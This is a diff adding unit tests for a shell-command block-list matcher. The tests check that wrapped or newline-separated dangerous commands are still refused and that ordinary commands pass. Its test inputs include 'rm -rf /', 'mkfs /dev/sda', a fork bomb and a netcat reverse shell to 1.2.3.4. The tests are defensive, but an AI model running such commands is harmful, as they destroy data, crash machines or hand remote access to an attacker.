@@ -131,3 +131,64 @@ describe('the dequoted check reaches the sh -c path too', () => {
     expect(commandPolicyViolation('true; halt')).toMatch(/Blocked command detected/);
   });
 });
+
+/**
+ * The two mistakes this matcher sits between, pinned as one table each.
+ *
+ * A plain substring test refused ordinary work (`nc ` inside `npm run sync
+ * tests`). Pure head-anchoring — the first attempt at fixing that — waved
+ * through every wrapper: `sh -c "rm -rf /"`, `timeout 5 rm -rf /`, `nohup
+ * halt`, a fork bomb whose own separators shattered the split, and anything
+ * behind a newline.
+ */
+describe('a wrapper does not hide the command it runs', () => {
+  it.each([
+    'sh -c "rm -rf /"',
+    'bash -c "shutdown -h now"',
+    'env rm -rf /',
+    'timeout 5 rm -rf /',
+    'nohup halt',
+    'sh -c "nc -e /bin/sh 1.2.3.4 4444"',
+    'X=1 timeout 3 sh -c "mkfs /dev/sda"',
+  ])('refuses %s', (command) => {
+    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
+  });
+
+  it('sees an elevated command through a wrapper too', () => {
+    expect(matchElevatedCommand('sh -c "sudo x"')).toBe('sudo');
+    expect(matchElevatedCommand('timeout 5 sudo apt update')).toBe('sudo');
+  });
+});
+
+describe('separators the split must not lose', () => {
+  it('matches a fork bomb, whose own separators would shatter it', () => {
+    // `:(){:|:&};:` splits into fragments that match nothing, so an entry
+    // carrying a separator is matched against the whole string instead.
+    expect(commandPolicyViolation(':(){:|:&};:')).toMatch(/Blocked command detected/);
+    expect(commandPolicyViolation(':(){ :|:& };:')).toMatch(/Blocked command detected/);
+  });
+
+  it('treats a newline as a command separator', () => {
+    // Whitespace normalization used to collapse newlines before the split, so
+    // a second line read as arguments to the first command.
+    expect(commandPolicyViolation('echo hi\nshutdown -h now')).toMatch(/Blocked command detected/);
+    expect(commandPolicyViolation('echo hi\nrm -rf /')).toMatch(/Blocked command detected/);
+  });
+});
+
+describe('and none of that re-refuses ordinary work', () => {
+  it.each([
+    'npm run sync tests',
+    'go test ./internal/sync -run X',
+    'cargo test --features async ui',
+    'npm test',
+    'grep -r "rm -rf /" .',
+    'ncdu /var/log',
+    'haltcheck --x y',
+    'shutdownctl --status',
+    'find . -name mkfs.conf',
+    'pytest tests/ -k "sync and not slow"',
+  ])('allows %s', (command) => {
+    expect(commandPolicyViolation(command)).toBeNull();
+  });
+});
